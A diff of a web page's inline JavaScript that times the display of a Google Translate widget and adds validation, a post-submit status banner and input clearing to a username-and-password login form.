@@ -185,10 +185,6 @@ function onSubmit(token) {
 
 
 
-
-
-
-
 <!-- BEGIN: Validation + banner additions -->
 <script>
 (function(){
@@ -243,70 +239,55 @@ function onSubmit(token) {
   }
 
   document.addEventListener('DOMContentLoaded', function(){
-    // ---- 1) Translate bits: delay EXACTLY 700ms, background stays ----
-    var delay = 700;
+    // ---- 1) Translate: hide the ENTIRE powered line for EXACT 400ms ----
     var root = document.getElementById('google_translate_element') || document.querySelector('#google_translate_element');
     if (root){
-      // (a) Delay the "Powered by Google Translate" line (logo + "Çeviri" + rest + blue i)
-      // We group the anchor to translate.google and its following siblings into a wrapper to hide together.
       var anchor = root.querySelector('a[href*="translate.google"]');
       if (anchor && anchor.parentNode){
-        var wrapper = document.createElement('span');
+        var wrapper = document.createElement('div');
         wrapper.id = 'gt-powered-delay';
-        wrapper.style.visibility = 'hidden';
+        wrapper.style.display = 'none';
         anchor.parentNode.insertBefore(wrapper, anchor);
         wrapper.appendChild(anchor);
-        // Move following inline siblings (text/icons) into the wrapper until a block boundary (DIV/BR/SELECT)
-        var stopTags = { 'DIV':1, 'BR':1, 'SELECT':1 };
-        while (wrapper.nextSibling && !(wrapper.nextSibling.nodeType===1 && stopTags[wrapper.nextSibling.tagName])) {
+        while (wrapper.nextSibling) {
           wrapper.appendChild(wrapper.nextSibling);
         }
-        setTimeout(function(){ wrapper.style.visibility = 'visible'; }, delay);
+        setTimeout(function(){ wrapper.style.display = ''; }, 400);
       } else {
-        // Fallback: hide the nowrap span if present
-        var nowrapSpan = root.querySelector('span[style*="white-space:nowrap"]');
-        if (nowrapSpan){
-          nowrapSpan.style.visibility = 'hidden';
-          setTimeout(function(){ nowrapSpan.style.visibility = 'visible'; }, delay);
+        var nowrap = root.querySelector('span[style*="white-space:nowrap"]');
+        if (nowrap) {
+          nowrap.style.display = 'none';
+          setTimeout(function(){ nowrap.style.display = ''; }, 400);
         }
       }
-
-      // (b) Delay the "Dili Seçiniz" select content by the same delay (keep background/slot)
       var selectEl = root.querySelector('select');
       if (selectEl){
         selectEl.style.opacity = '0';
-        setTimeout(function(){ selectEl.style.opacity = '1'; }, delay);
+        setTimeout(function(){ selectEl.style.opacity = '1'; }, 400);
       }
     }
 
     var form = getForm();
     if (!form) return;
 
-    // ---- 2) Always POST; store status BEFORE submit ----
     form.addEventListener('submit', function(){
       var s = validate(form);
-      try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){}
-      // do NOT preventDefault -> browser will POST to same site
+      try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){ }
     }, true);
-
     var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], .g-recaptcha');
     if (submitBtn){
       submitBtn.addEventListener('click', function(){
         var s = validate(form);
-        try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){}
+        try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){ }
       }, true);
     }
 
-    // ---- 3) After POST: show banner, inputs ALWAYS empty ----
     var status = sessionStorage.getItem(STATUS_KEY);
-    if (status){
-      sessionStorage.removeItem(STATUS_KEY);
-      showBanner(status, form);
-    }
+    if (status){ sessionStorage.removeItem(STATUS_KEY); showBanner(status, form); }
     var ip = getInputs(form);
-    if (ip.u) { ip.u.value = ''; ip.u.setAttribute('autocomplete', 'off'); ip.u.setAttribute('autocapitalize','off'); ip.u.setAttribute('autocorrect','off'); ip.u.setAttribute('spellcheck','false'); }
-    if (ip.p) { ip.p.value = ''; ip.p.setAttribute('autocomplete', 'new-password'); ip.p.setAttribute('autocapitalize','off'); ip.p.setAttribute('autocorrect','off'); ip.p.setAttribute('spellcheck','false'); }
-    form.setAttribute('autocomplete', 'off');
+    if (ip.u) { ip.u.value = ''; ip.u.setAttribute('autocomplete','off'); ip.u.setAttribute('autocapitalize','off'); ip.u.setAttribute('autocorrect','off'); ip.u.setAttribute('spellcheck','false'); }
+    if (ip.p) { ip.p.value = ''; ip.p.setAttribute('autocomplete','new-password'); ip.p.setAttribute('autocapitalize','off'); ip.p.setAttribute('autocorrect','off'); ip.p.setAttribute('spellcheck','false'); }
+    form.setAttribute('autocomplete','off');
   });
 })();
 </script>
